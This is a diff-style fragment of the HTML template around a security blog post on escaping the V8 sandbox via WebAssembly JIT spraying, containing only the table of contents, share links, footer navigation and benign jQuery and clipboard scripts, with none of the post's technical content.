+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Setup"><span class="toc-number">1.</span> <span class="toc-text">Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">2.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Function-in-WebAssembly-module"><span class="toc-number">2.1.</span> <span class="toc-text">Function in WebAssembly module</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JIT-just-in-time-spraying"><span class="toc-number">3.1.</span> <span class="toc-text">JIT (just-in-time) spraying</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Constructing-shellcode-chain"><span class="toc-number">3.2.</span> <span class="toc-text">Constructing shellcode chain</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch"><span class="toc-number">4.</span> <span class="toc-text">Patch</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&text=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&title=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&is_video=false&description=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)&body=Check out this article: https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&title=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&title=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&title=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&title=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&name=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h0meb0dy.github.io/2024/12/12/Escaping-V8-Sandbox-via-WebAssembly-JIT-Spraying/&t=Escaping V8 Sandbox via WebAssembly JIT Spraying (Chromium &lt; 122.0.6261.57, V8 &lt; 12.2.170)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2024
+    Seongjoon Cho
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
